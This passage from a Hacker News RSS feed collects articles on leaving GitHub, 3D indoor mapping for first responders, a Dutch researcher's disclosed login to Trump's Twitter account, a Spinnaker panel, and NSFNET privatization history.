<p>Perhaps the younger generations don't know anything about the past "evils" of Microsoft and naively believe that Microsoft is now the good friend to Open Source, but the truth is that all these acquisitions of Open Source projects is a business tactic that is put in place to improve Microsoft's loosing position to Open Source. It is a matter of control.</p>
<p>Just yesterday <a href="https://www.minecraft.net/en-us/article/java-edition-moving-house">Microsoft announced</a> that Minecraft will require a Microsoft account to play in 2021 and that owners of the classic version will be forced to migrate.</p>
<p>While this is not related to Open Source, it is a really good example of how bad it can get if Microsoft sometime in the future decides that projects on GitHub are required to do something which goes against these projects interests.</p>
<p>I will not name any names, because that is not important, but how in the world can any Open Source project that regards their code base as valuable not make sure that they have a completely up to date copy of every single line of code outside of GitHub!?</p>
<p>Some project developers only keep parts on the code in personal repositories, others haven't even got a backup but trust fully that GitHub will always have a working and current release of the latests commits.</p>
<p>For years people have warned about the position GitHub had in the world of Open Source because it concentrates too much of the power to make or break the community in a single entity. Having Microsoft behind the steering wheel makes the situation a thousand times worse.</p>
<p>Nobody in their right mind would ever have imagined uploading Open Source code to Microsoft servers just a decade ago. Microsoft where the archenemy of Open Source in the nineties and they deployed all kinds of dirty tactics to keep other operating systems out of the market, especially dirty tactics against Linux. In the early 2000s the then CEO Steve Ballmer said, <q>Linux is a cancer that attaches itself in an intellectual property sense to everything it touches.</q> And for many years they tried to gain control over Linux and manipulated the market in different ways in order to "crush the competition". When they realized they couldn't do that and that the battle was lost, they deployed a new tactic in which they instead try to make money of Linux, which is what that are doing now in a lot of areas, and which is why they seem "friendlier" to the Open Source community.</p>
<p>I myself do have some code residing on GitHub (haven't had the time to migrate yet), but nothing of my code is important what so ever, and I of course have multiple up-to-date clones and backups elsewhere. However, having the worlds largest repository of Open Source code still reside in the hands of Microsoft is just madness. Why haven't all the major projects migrated? Running a self-hosting Git server isn't that difficult and there even exists several solutions that are pretty solid.</p>
<p>More and more of all the good stuff about Open Source and community driven development and sharing of resources, code and experience is slowly getting either gobbled up or ruined and massacred by big corporations or economically based foundations. Why is it that as soon as money enters into the picture everything turns into crap? Of course, greed is the answer, but an even more important question than that is: Why is it that we have stopped caring?</p>
<p>Large projects should self-host their repositories in order to stay completely independent, but some alternative solutions to the more popular services such as GitHub, GitLab and BitBucket does exist (not an exhaustive list):</p>
<ul>
<li><a href="https://codeberg.org/">Codeberg</a><br>Codeberg is a registered German non-profit organization and I think it is the best alternative. Codeberg does not depend on external services. No third party cookies, no tracking. Hosted in the EU.<br>Relevant discussion on <a href="https://news.ycombinator.com/item?id=22795930">Hacker News</a>. Relevant <a href="https://codeberg.org/codeberg/org/src/branch/master/PrivacyPolicy.md">Privacy Policy</a></li>
<li><a href="https://notabug.org/">NotABug</a><br>NotABug.org is run by <a href="https://peers.community/">Peers</a>, a group of people interested in free software and free society. It is mostly for small projects though. Relevant <a href="https://notabug.org/tos">Privacy Policy</a>.</li>
<li><a href="https://sourcehut.org/">sourcehut</a><br>sourcehut is currently considered alpha and it is not going to stay free, but it does not have any tracking or advertising. All features work without JavaScript. Relevant <a href="https://man.sr.ht/privacy.md">Privacy Policy</a>. Relevant discussion on <a href="https://news.ycombinator.com/item?id=23030489">Hacker News</a>. After signing up you get the following message: <q>Payment is optional during the alpha, but be aware that it will become mandatory later. This service is funded by its users, not by investors.</q></li>
</ul>
<p>A few good solutions for self-hosting (not an exhaustive list):</p>
<ul>
<li><a href="https://gogs.io/">Gogs</a> - old discussion at <a href="https://news.ycombinator.com/item?id=11374003">Hacker News</a></li>
<li><a href="https://gitea.io/en-US/">Gitea</a> a community-managed fork of Gogs - discussed at <a href="https://news.ycombinator.com/item?id=17006503">Hacker News</a></li>
<li><a href="https://github.com/theonedev/onedev">OneDev</a> - discussed at <a href="https://news.ycombinator.com/item?id=22081419">Hacker News</a></li>
</ul>
</article></div>]]>
            </description>
            <link>https://unixsheikh.com/articles/important-open-source-projects-should-not-use-github.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24866580</guid>
            <pubDate>Fri, 23 Oct 2020 06:33:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Creating 3D maps of complex buildings for disaster management]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24866391">thread link</a>) | @finphil
<br/>
October 22, 2020 | https://www.utwente.nl/en/news/2020/10/829716/creating-3d-maps-of-complex-buildings-for-disaster-management | <a href="https://web.archive.org/web/*/https://www.utwente.nl/en/news/2020/10/829716/creating-3d-maps-of-complex-buildings-for-disaster-management">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main"><div><div><p><span></span>Wednesday 21 October 2020</p><div data-autointrotext=""><p><b>In case of an emergency, first responders like the fire brigade need up-to-date information. 2D maps are a common source of information but they can be difficult to read in an emergency situation. UT PhD-student Shayan Nikoohemat created an algorithm that can accurately generate 3D models of the insides of large buildings from point clouds.</b></p><p>Indoor 3D models are the digital twins of building interiors. The 3D models could be used by first responders to get a good impression of large buildings, like shopping malls, a hospital or a sports complex, on their way to the emergency. 2D maps represent important information – like the location of emergency exits – on tangled floor plans, making them difficult too read quickly and after each reconstruction, these maps are outdated. “Sometimes, these maps are so outdated that the real building looks completely different than the floor plans. We need a fast and reliable approach to create the digital 3D model of interiors.”, says Shayan.</p><h2><a id="from-point-clouds-to-3d-map"></a>From point clouds to 3d map</h2><p>Luckily, laser scanners can quickly scan a whole building after every reconstruction. However, these scanners create point clouds, unstructured data which still has to be converted into a 3D model. The data doesn’t know if a scanned point is a wall, an exit or, for example, a table. According to Shayan, his program solved this: “For my PhD thesis, I created&nbsp;algorithms that automatically understand the data and can create 2D and 3D maps. We can detect and model doors, stairs, obstacles and navigable areas which are crucial data for the emergency planning.”</p><p><img src="https://1348661504.rsc.cdn77.org/.uc/ia68fda4b010288850e01584947034c146ab17af56d340701c4eb00bf0080/u4spzp0rofycx9foknvzw.png" alt="" width="235" height="191"><img src="https://1348661504.rsc.cdn77.org/.uc/i90ed1dbe010289850e01584947033c8b580b7352190d0701c4f300a40080/dmfesmsqurzdg6at3vcxgw.png" alt="" width="243" height="164"> </p><p><i>Figure 1: The point clouds and final 3D Model of the fire brigade building in Haaksbergen</i></p><h2><a id="recognizing-elements"></a>Recognizing elements</h2><p>The algorithm can recognize different structural elements such as walls, slabs, ceilings, and openings. Individual items like furniture, however, still pose a problem. “It is not yet able to correctly label everything, but the structural elements are enough to create an accurate map, which we tested on several real datasets,” he says. During his postdoc, he will further develop the system to also work for individual items. Huib Fransen of the Safety Region Rotterdam-Rijnmond was delighted with the results: “Shayan’s project is exciting for us and we were happy to provide him with the scanning sites for test cases.”&nbsp;</p><h2><a id="more-information"></a>MORE INFORMATION</h2><p>Shayan did his research and is now working as a postdoc at the Department of Earth Observation Sciences (EOS; Faculty ITC) and was supervised by Prof.Dr.Ir. M.G. Vosselman. His research project was initiated by the UT, TU Delft, and the Dutch FireBrigade (iNowit, Brandweer Nederland) and industry partners&nbsp;(CGI, Cyclomedia and Leap3D) and the Open Geospatial Consortium (OGC) to support disaster management in public buildings. The project was funded through&nbsp;<a href="http://maps4society.nl/">the NWO Partnership Programme Map4Society</a>. Shayan defended his PhD thesis, titled&nbsp;<i>Indoor 3D Reconstruction of Buildings from Point Clouds</i>, on 21 October.</p></div></div><div><div><p>K.W. Wesselink MSc (Kees)</p><p>Communication Officer (available Mon-Fri)</p></div></div></div></div></div>]]>
            </description>
            <link>https://www.utwente.nl/en/news/2020/10/829716/creating-3d-maps-of-complex-buildings-for-disaster-management</link>
            <guid isPermaLink="false">hacker-news-small-sites-24866391</guid>
            <pubDate>Fri, 23 Oct 2020 05:50:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dutch Ethical Hacker Logs into Trump’s Twitter Account]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24866343">thread link</a>) | @janwillemb
<br/>
October 22, 2020 | https://www.volkskrant.nl/cs-badaa815 | <a href="https://web.archive.org/web/*/https://www.volkskrant.nl/cs-badaa815">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section data-artstyle-marker="paywall"><section data-artstyle-marker="paywall"><figure data-element-id="71cde2cd-2335-4b84-b278-26460a834b90"><picture><source srcset="https://images2.persgroep.net/rcs/3L2D94DUUcqGUKV6M79IbLq4gq0/diocontent/177978718/_fitwidth/1240?appId=93a17a8fd81db0de025c8abd1cca1279&amp;quality=0.9&amp;desiredformat=webp" type="image/webp"><source srcset="https://images4.persgroep.net/rcs/YzsBRwzCgK61WPSnuHpvToefLsQ/diocontent/177978718/_fitwidth/1240?appId=93a17a8fd81db0de025c8abd1cca1279&amp;quality=0.9" type="image/jpeg"><img data-credit="Beeld Getty Images" data-height="885" data-original="https://images4.persgroep.net/rcs/YzsBRwzCgK61WPSnuHpvToefLsQ/diocontent/177978718/_fitwidth/1240?appId=93a17a8fd81db0de025c8abd1cca1279&amp;quality=0.9" data-title="U.S. President Donald Trump works on his phone during a roundtable at the State Dining Room of the White House June 18, 2020." data-width="1240" src="https://images4.persgroep.net/rcs/YzsBRwzCgK61WPSnuHpvToefLsQ/diocontent/177978718/_fitwidth/1240?appId=93a17a8fd81db0de025c8abd1cca1279&amp;quality=0.9"> </picture><figcaption><cite>U.S. President Donald Trump works on his phone during a roundtable at the State Dining Room of the White House June 18, 2020.</cite><span>Beeld Getty Images</span></figcaption></figure><p data-element-id="4aeb-3d95-850b-1e5e-3b11-54f3-9f2c-5a33">The researcher, Victor Gevers, had access to Trump’s personal messages, could post tweets in his name and change his profile. Gevers took screenshots when he had access to Trump’s account. These screenshots were shared with <i>de Volkskrant </i>by the monthly opinion magazine&nbsp;<a href="https://www.vn.nl/trump-twitter-hacked-again/" target="_blank">Vrij Nederland</a>. Dutch security experts find Gevers’ claim credible.</p><p data-element-id="f7d4-df7f-98ec-67eb-d049-540f-292a-5617">The Dutchman alerted Trump and American government services to the security leak. After a few days, he was contacted by the American Secret Service in the Netherlands. This agency is also responsible for the security of the American President and took the report seriously, as evidenced by correspondence seen by de Volkskrant. Meanwhile Trump’s account has been made more secure.</p><p data-element-id="cd30-cedb-07c2-93d7-a663-5828-30a5-5d9a">This is not the first time that Dutch hackers succeeded in taking over Donald Trump’s Twitter account. The first time was four years ago, just before the 2016 elections, when three hackers jointly managed to retrieve Trump’s password and access his account. That someone has now succeeded again, is remarkable. During the previous presidential elections Russian hackers attempted to influence the elections on a large scale. Subsequently, social media have taken various steps to prevent manipulation.</p><p data-element-id="cb67-ef02-5e43-1c58-e530-8e49-5d42-7cd2">Today as well, barely three weeks before the presidential elections, attempts are being made from Russia and Iran to digitally influence the elections. Obviously, the President’s Twitter account is a target too. Twitter declines to respond on the record, stating that they never comment on security measures for individual accounts. Ronald Prins, founder of security company Hunt &amp; Hackett and one of the best-known Dutch security experts, says: ‘I’ve known Victor Gevers for quite a few years. He has a reputation of devoting his life to finding vulnerabilities and always adopts a very ethical attitude in doing so. On the basis of what I know and have seen, his claim seems credible.’</p><h3 data-element-id="3cd7-0aef-c61e-659e-e0e2-9543-03a8-128f">2016 hack</h3><p data-element-id="720f-405b-63d6-f369-e9e8-6270-6c66-658a">Victor Gevers was also one of the three hackers who logged into Trump’s account in 2016. ‘That we would succeed in doing it again so soon, was not planned’, he says about the buildup to the action. The reason for making another attempt to hack Trump’s account was the reporting in the US about Hunter Biden. A hard disk owned by presidential candidate Joe Biden’s son was supposedly stolen or hacked – also because Hunter Biden used an easy to guess password (Hunter02). Gevers is familiar with leaked databases of old passwords and searched these for Hunter Biden’s data. After analysing these old databases, he felt that the information was incorrect. Hunter Biden used other passwords. Gevers: ‘I could tell that it wasn’t his password.’</p><p data-element-id="75db-2de2-faf8-fc31-16d0-d99f-b879-3ccd">It gives him the idea to check how good the security of verified Twitter accounts actually is. He looks at the account of Susan Rice, the former US national security adviser, and at that of Joe Biden. And also takes a look at Donald Trump, while he’s at it. ‘Doing spot checks, that’s my work: look for any leaks in security.’</p><p data-element-id="d4fd-0bc3-c406-a8b0-3268-6c9e-8769-2843">Earlier discoveries by Gevers include an enormous Chinese database with the location data of 2.7 million inhabitants of Xinjang – China’s largest province and home to the Uyghurs. The poorly secured database contained all kinds of personal data: people’s ID number, nationality, phone number, date of birth, photos, employer, but also GPS coordinates of the places these individuals had visited. The existence of this database made it even clearer how meticulously China is monitoring the Uyghur minority in the country.</p><p data-element-id="45f1-e3ef-2f67-eaca-666a-a367-2947-c3e4">On Friday morning, almost absentmindedly, Gevers tries a number of passwords and their variations. On the fifth attempt: bingo! He tries ‘maga2020!’ (short for make America great again) and suddenly finds himself in the Twitter account of the American President. He is flabbergasted. Gevers: ‘I expected to be blocked after four failed attempts. Or at least would be asked to provide additional information.’ None of that.</p><p data-element-id="0a49-c680-a98e-21e9-d291-70bc-18bf-975f">On that Friday morning, Gevers has access to what is perhaps the most important Twitter account in the world and is in a position to send a message to 87 million people, the attentive world press, and government leaders. Gevers: ‘I did think: “Here we go again”.’</p><h3 data-element-id="5342-211d-6946-9cf2-ebf8-89fd-fcd1-b8c2">Illegal</h3><p data-element-id="2da9-1ce3-bc38-1f09-e397-5636-d20b-c1a1">After all, hacking an account is illegal. If Gevers wants to make it clear that he is acting with good intentions, he will have to proceed responsibly and document his steps. He takes screenshots. Then he sends an email to Donald Trump – ‘I still had an old email account of his’ – and sends a copy to the American organisation for digital security. He kindly advises Trump to take extra security measures. And perhaps use a somewhat longer password. Gevers even suggests one: !IWillMakeAmericaGreatAgain2020!, and adds instructions for activating two-step verification. ‘But I didn’t get a reply.’</p><p data-element-id="f6ea-8910-66b0-bf9a-95b6-b615-5fea-8aaf">So, he tries to warn others. Trump’s campaign team, his family. He sends messages via Twitter asking if someone will call Trump’s attention to the fact that his Twitter account is not safe. He tags the CIA, the White House, the FBI, Twitter themselves. No response.</p><p data-element-id="aac2-5921-f32c-921b-6962-09da-fe3a-ed47">Gevers: ‘Then on Saturday, I suddenly saw that two-step verification for the account had been activated.’ Two days later, in the evening, he receives an email from the American Secret Service. ‘Friendly. They were interested in my information. I forwarded everything to them.’ On Tuesday they speak digitally. They thank Gevers, telling him that they were unaware of the security leak. This still leaves the security researcher with a number of questions: ‘Why is it possible for someone from a different time zone to log into such an important account? Why doesn’t Twitter demand better passwords? If I can access his account, then foreign nations can do so as well, right? Why aren’t the persons who are supposed to protect the President informed when someone reports that his account is unsafe?’</p><h3 data-element-id="6701-b1b1-7279-551d-015e-e20b-5efc-6540">Surprisingly easy</h3><p data-element-id="c0f4-6fcc-64af-62c3-2b8d-84c3-109f-6fac">Matthijs Koot, security researcher at Secura, is also astonished at how easy it was for Gevers to take over Trump’s account. ‘To put it harshly: people who in the year 2020 still ignore basic advice on online security are a potential danger to themselves and to those around them.’</p><p data-element-id="47c2-0c2c-b48f-fc57-7b10-7e05-6d7f-065f">According to Koot, these risks also affect others. ‘Today, we are increasingly interconnected, which means that a hack of one individual’s account or computer may also undermine the privacy and security of others. After all, via Trump’s account you can also see private messages sent to him or refer others to links containing malware or to a fake login page.’ This raises the question of how responsible Twitter is when it comes to additional security measures. Koot: ‘They should either compel people to use additional authentication or, if people really don’t want this, make them use a complex password. The days of logging in with just a weak password are over.’</p><p data-element-id="364a660b-32af-4ff8-b17b-8a49a27d61d8"><span>Twitter declines to respond to questions. The question remains why Trump was using such a weak and simple password. Gevers has a possible explanation: ‘Trump is over 70 – elderly people often switch off two-step verification because they find it too complicated. My own mother, for instance. For younger generations digital security is more self-evident.’</span></p></section></section></div>]]>
            </description>
            <link>https://www.volkskrant.nl/cs-badaa815</link>
            <guid isPermaLink="false">hacker-news-small-sites-24866343</guid>
            <pubDate>Fri, 23 Oct 2020 05:42:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Kelsey Hightower: Spinnaker is a Standard Library for software delivery]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24865962">thread link</a>) | @drodio
<br/>
October 22, 2020 | https://www.armory.io/blog/spinnaker-as-a-standard-library-for-cloud-native-software-delivery/ | <a href="https://web.archive.org/web/*/https://www.armory.io/blog/spinnaker-as-a-standard-library-for-cloud-native-software-delivery/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
                

        <main id="global-main">

                        
                        



<section>
    <div>
        <div id="post-7406">
          
            
            <div><figure><img width="2048" height="186" src="https://www.armory.io/wp-content/uploads/2020/10/devops-panel.png" alt="" loading="lazy" srcset="https://www.armory.io/wp-content/uploads/2020/10/devops-panel.png 2048w, https://www.armory.io/wp-content/uploads/2020/10/devops-panel-768x70.png 768w, https://www.armory.io/wp-content/uploads/2020/10/devops-panel-1024x93.png 1024w, https://www.armory.io/wp-content/uploads/2020/10/devops-panel-360x33.png 360w, https://www.armory.io/wp-content/uploads/2020/10/devops-panel-1536x140.png 1536w" sizes="(max-width: 2048px) 100vw, 2048px"></figure></div>            <div>
                
                <p><strong>We just did a great panel with <a href="https://digitalanarchist.com/videos/features/kelsey-hightower-andy-glover-isaac-mosquera-and-drodio-techstrong-tv">Alan Shimmel of DevOps.com</a>, along with:</strong></p>
<ul>
<li>Sarah Novotny, Open Source in Microsoft’s Azure Office of the CTO</li>
<li>Kelsey Hightower, Staff Developer Advocate at Google</li>
<li>Andy Glover, Director of Productivity Engineering at Netflix</li>
<li>Isaac Mosquera, CTO at Armory and DROdio, CEO at Armory</li>
</ul>
<p><strong>Kelsey described Spinnaker as a “Standard Library” for software delivery, instead of piecing together software delivery tooling yourself.</strong></p>
<p><iframe src="https://player.vimeo.com/video/470270709" width="750" height="420" frameborder="0" allowfullscreen="allowfullscreen"><span data-mce-type="bookmark" style="display: inline-block; width: 0px; overflow: hidden; line-height: 0;" class="mce_SELRES_start">﻿</span></iframe></p>
<p><strong>In the video we discuss:</strong></p>
<ul>
<li>Minute 2:35: Leaders in the Spinnaker community from Netflix, Microsoft and Google, talking about thems around enterprise software delivery</li>
<li>Minute 4:15: How enterprises are moving beyond the Spinnaker use-case, and the investments IaaS providers are making in the cloud</li>
<li>Minute 5:55: Discovery’s use case example — an ability to deploy with safety and security to multiple cloud targets</li>
<li>Minute 8:01: Being able to deploy code “when it’s ready” — if it’s ready in 6 months, being able to deploy in “6 months and two minutes”</li>
<li>Minute 9:18: Delivery is just one of many steps in software delivery</li>
<li>Minute 10:20: How long does it take to create a platform like Spinnaker?</li>
<li>Minute 12:45: How “tall do you need to be to ride the ride?” Discussing levels of sophistication to leverage the value from a project like Spinnaker</li>
<li>Minute 15:03: How Spinnaker is a platform that enables companies to get both safety&nbsp;<em>and</em> velocity — and prioritize developer value creation potential</li>
<li>Minute 16:20: How Spinnaker enables trust within an organization to achieve not just continuous delivery, but continuous <em>improvement</em></li>
<li>Minute 19:30: What companies are and are not a good fit for Spinnaker</li>
<li>Minute 21:40: How “8 apps” is a tipping point</li>
<li><strong>Minute 22:18: How Spinnaker acts as a “Standard Library” for software delivery, instead of piecing together software delivery tooling yourself</strong></li>
<li>Minute 26:20: Sharing best-practices across all users by using Spinnaker, due to its OSS and modular plug-in nature</li>
<li>Minute 29:40: The “Spinnaker&nbsp;<em>and” </em>approach vs. “Spinnaker&nbsp;<em>or”. </em></li>
<li>Minute 31:10: How to leverage the opinionated nature of Spinnaker while leveraging it as a set of core building blocks:&nbsp; — for example, “blue/green” deployments can mean something different across teams and companies</li>
<li>Minute 38:30: Spinnaker is OSS — focus your effort on helping make it better, instead of re-building your tooling in-house</li>
<li>Minute 41:05: Focus on the bigger picture — throwing the birthday party vs. baking the cake</li>
</ul>
            </div>
        </div>
    </div>
</section>



<section>
  
</section>
<section>
  <div>
    <div>
      <div>
        <div>

      
<div>
    <p><img src="https://www.armory.io/wp-content/uploads/2020/10/Screen-Shot-2020-10-21-at-4.16.34-PM.png" alt=""></p>
  
    
  
    <p>Creating your own Spinnaker custom stage</p>
  
    <p>Most customizations that the Spinnaker community creates are custom stages. Spinnaker offers many different stage types by default, but there’s always more that we would like to see in the pipeline. Spinnaker is a powerful tool not just for deployments but also orchestrating pre and post-deploy tasks, such a provisioning supporting infrastructure and rolling back […]</p>
  
  
</div>
      
<div>
    <p><img src="https://www.armory.io/wp-content/uploads/2020/10/devops-panel-768x70.png" alt=""></p>
  
    
  
    <p>The "State of Spinnaker" Panel</p>
  
    <p>We just did a great “State of Spinnaker” panel with Alan Shimmel of DevOps.com, along with: Kelsey Hightower, staff developer advocate at Google Andy Glover, Director of Productivity Engineering at Netflix Isaac Mosquera, CTO at Armory and DROdio, CEO at Armory In the video we discuss: How Spinnaker has expanded beyond the Netflix use case […]</p>
  
  
</div>
      
<div>
    <p><img src="https://www.armory.io/wp-content/uploads/2020/10/Agent-mode-768x411-1.png" alt=""></p>
  
    
  
    <p>Introducing the Armory Agent for Kubernetes</p>
  
    <p>We're uncovering the Armory Agent for Kubernetes: a more flexible, scalable, and secure way for Spinnaker to interact with your Kubernetes infrastructure. Learn more about why we built the Agent, how it works, and how it helps you unlock large-scale Kubernetes deployments. </p>
  
  
</div>
  
        </div>
      </div>
    </div>
  </div>
</section>


        </main>

        

        </div></div>]]>
            </description>
            <link>https://www.armory.io/blog/spinnaker-as-a-standard-library-for-cloud-native-software-delivery/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24865962</guid>
            <pubDate>Fri, 23 Oct 2020 04:07:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Internet Ascendant, Part 2: Going Private and Going Public]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24865905">thread link</a>) | @cfmcdonald
<br/>
October 22, 2020 | https://technicshistory.com/2020/10/22/internet-ascendant-part-2-going-private-and-going-public/ | <a href="https://web.archive.org/web/*/https://technicshistory.com/2020/10/22/internet-ascendant-part-2-going-private-and-going-public/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>In the summer of 1986, Senator Al Gore, Jr., of Tennessee introduced an amendment to the Congressional Act that authorized the&nbsp; budget of the National Science Foundation (NSF). He called for the federal government to study the possibilities for “communications networks for supercomputers at universities and Federal research facilities.” To explain the purpose of this legislation, Gore called on a striking analogy:&nbsp;</p>



<blockquote><p>One promising technology is the development of fiber optic systems for voice and data transmission. Eventually we will see a system of fiber optic systems being installed nationwide. America’s highways transport people and materials across the country. Federal freeways connect with state highways which connect in turn with county roads and city streets. T<em>o transport data and ideas,</em> <em>we will need a telecommunications highway connecting users coast to coast, state to state, city to city</em>. The study required in this amendment will identify the problems and opportunities the nation will face in establishing that highway.<sup>1</sup></p></blockquote>



<p>In the following years, Gore and his allies would call for the creation of an “information superhighway”, or, more formally, a national information infrastructure (NII). As he intended, Gore’s analogy to the federal highway system summons to mind a central exchange that would bind together various local and regional networks, letting all American citizens communicate with one another. However, the analogy also misleads – Gore did not propose the creation of a federally-funded and maintained data network. He envisioned that the information superhighway, unlike its concrete and asphalt namesake, would come into being through the action of market forces, within a regulatory framework that would ensure competition, guarantee open, equal access to any service provider (what would later be known as “net neutrality”), and provide subsidies or other mechanisms to ensure universal service to the least fortunate members of society, preventing the emergence of a gap between the information rich and information poor.<sup>2</sup></p>



<p>Over the following decade, Congress slowly developed a policy response to the growing importance of computer networks to the American research community, to education, and eventually to society as a whole. Congress’ slow march towards an NII policy, however, could not keep up with the rapidly growing NSFNET, overseen by the neighboring bureaucracy of the executive branch. Despite its reputation for sclerosis, bureaucracy was created exactly because of its capacity, unlike a legislature, to respond to events immediately, without deliberation. And so it happened that, between 1988 and 1993, the NSF crafted the policies that would determine how the Internet became private, and thus went public. It had to deal every year with novel demands and expectations from NSFNET’s users and peer networks. In response, it made decisions on the fly, decisions which rapidly outpaced Congressional plans for guiding the development of an information superhighway. These decisions rested largely in the hands of a single man – Stephen Wolff.</p>



<h2>Acceptable Use</h2>



<p>Wolff earned a Ph.D. in electrical engineering at Princeton in 1961 (where he would have been a rough contemporary of Bob Kahn), and began what might have been a comfortable academic career, with a post-doctoral stint at Imperial College, followed by several years teaching at Johns Hopkins. But then he shifted gears, and took a position&nbsp; at the Ballistics Research lab in Aberdeen, Maryland. He stayed there for most of the 1970s and early 1980s, researching communications and computing systems for the U.S. Army. He introduced Unix into the lab’s offices, and managed Aberdeen’s connection to the ARPANET.<sup>3</sup></p>



<p>In 1986, the NSF recruited him to manage the NSF’s supercomputing backbone – he was a natural fit, given his experience connecting Army supercomputers to ARPANET. He became the principal architect of NSFNET’s evolution from that point until his departure in 1994, when he entered the private sector as a manager for Cisco Systems. The original intended function of the net that Wolff was hired to manage had been to connect researchers across the U.S. to NSF-funded supercomputing centers. As we saw last time, however, once Wolff and the other network managers saw how much demand the initial backbone had engendered, they quickly developed a new vision of NSFNET, as a communications grid for the entire American research and post-secondary education community.</p>



<p>However, Wolff did not want the government to be in the business of supplying network services on a permanent basis. In his view, the NSF’s role was to prime the pump, creating the initial demand needed to get a commercial networking services sector off the ground. Once that happened, Wolff felt it would be improper for a government entity to be in competition with viable for-profit businesses. So he intended to get NSF out of the way by privatizing the network, handing over control of the backbone to unsubsidized private entities and letting the market take over.</p>



<p>This was very much in the spirit of the times. Across the Western world, and across most of the political spectrum, government leaders of the 1980s touted privatization and deregulation as the best means to unleash economic growth and innovation after the relative stagnation of the 1970s. As one example among many, around the same time that NSFNET was getting off the ground, the FCC knocked down several decades-old constraints on corporations involved in broadcasting. In 1985, it removed the restriction on owning print and broadcast media in the same locality, and two year later it nullified the fairness doctrine, which had required broadcasters to present multiple views on public-policy debates.&nbsp;</p>



<p>From his post at NSF, Wolff had several levers at hand for accomplishing his goals. The first lay in the interpretation and enforcement of the network’s acceptable use policy (AUP). In accordance with NSF’s mission, the initial policy for the NSFNET backbone, in effect until June 1990, required all uses of the network to be in support of “scientific research and other scholarly activities.” This is quite restrictive indeed, and would seem to eliminate any possibility of commercial use of the network. But Wolff chose to interpret the policy liberally. Regularly mailing list postings about new product releases from a corporation that sold data processing software – was that not in support of scientific research? What about the decision to allow MCI’s email system to connect to the backbone, at the urging of Vint Cerf, who had left government employ to oversee the development of MCI Mail. Wolff rationalized this – and other later interconnections to commercial email systems such as CompuServe’s – as in support of research by making it possible for researchers to communicate digitally with a wider range of people that they might need to contact in the pursuit of their work. A stretch, perhaps. But Wolff saw that allowing some commercial traffic on the same infrastructure that was used for public NSF traffic would encourage the private investment needed to support academic and educational use on a permanent basis.&nbsp;</p>



<p>Wolff’s strategy of opening the door of NSFNET as far as possible to commercial entities got an assist from Congress in 1992, when Congressman Rick Boucher, who helped oversee NSF as chair of the Science Subcommittee, sponsored an amendment to the NSF charter which authorized any additional uses of NSFNET that would “tend to increase the overall capabilities of the networks to support such research and education activities.” This was an<em> ex post facto </em>validation of Wolff’s approach to commercial traffic, allowing virtually any activity as long as it produced profits that encouraged more private investment into NSFNET and its peer networks.&nbsp;&nbsp;</p>



<h2>Dual-Use Networks</h2>



<p>Wolff also fostered the commercial development of networking by supporting the regional networks’ reuse of their networking hardware for commercial traffic. As you may recall, the NSF backbone linked together a variety of not-for-profit regional nets, from NYSERNet in New York to Sesquinet in Texas to BARRNet in northern California. NSF did not directly fund the regional networks, but it did subsidize them indirectly, via the money it provided to labs and universities to offset the costs of their connection to their neighborhood regional net. Several of the regional nets then used this same subsidized infrastructure to spin off a for-profit commercial enterprise, selling network access to the public over the very same wires used for the research and education purposes sponsored by NSF. Wolff encouraged them to do so, seeing this as yet another way to accelerate the transition of the nation’s research and education infrastructure to private control.&nbsp;</p>



<p>This, too, accorded neatly with the political spirit of the 1980s, which encouraged private enterprise to profit from public largesse, in the expectation that the public would benefit indirectly through economic growth. One can see parallels with the dual-use regional networks in the 1980 Bayh-Dole Act, which defaulted ownership of patents derived from government-funded research to the organization performing the work, not to the government that paid for it.&nbsp;</p>



<p>The most prominent example of dual-use in action was PSINet, a for-profit company initially founded as Performance Systems International in 1988. William Schrader and Martin Schoffstall, the co-founder of NYSERNet and one of vice presidents’, respectively, created the company. Schofstall, a former BBN engineer and co-author of the Simple Network Management Protocol (SNMP) for managing the devices on an IP network, was the key technical leader. Schrader, an ambitious Cornell biology major and MBA who had helped his <em>alma mater </em>set up its supercomputing center and get it connected to NSFNET, provided the business drive. He firmly believed that …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://technicshistory.com/2020/10/22/internet-ascendant-part-2-going-private-and-going-public/">https://technicshistory.com/2020/10/22/internet-ascendant-part-2-going-private-and-going-public/</a></em></p>]]>
            </description>
            <link>https://technicshistory.com/2020/10/22/internet-ascendant-part-2-going-private-and-going-public/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24865905</guid>
            <pubDate>Fri, 23 Oct 2020 03:54:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Egypt Blocks Access to Telegram]]>
            </title>
            <description>
<![CDATA[
Score 153 | Comments 73 (<a href="https://news.ycombinator.com/item?id=24865875">thread link</a>) | @emptysongglass
<br/>
October 22, 2020 | https://masaar.net/en/the-egyptian-authorities-block-telegram/ | <a href="https://web.archive.org/web/*/https://masaar.net/en/the-egyptian-authorities-block-telegram/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-3127" itemtype="https://schema.org/CreativeWork" itemscope="itemscope">
<div>

<div itemprop="text">
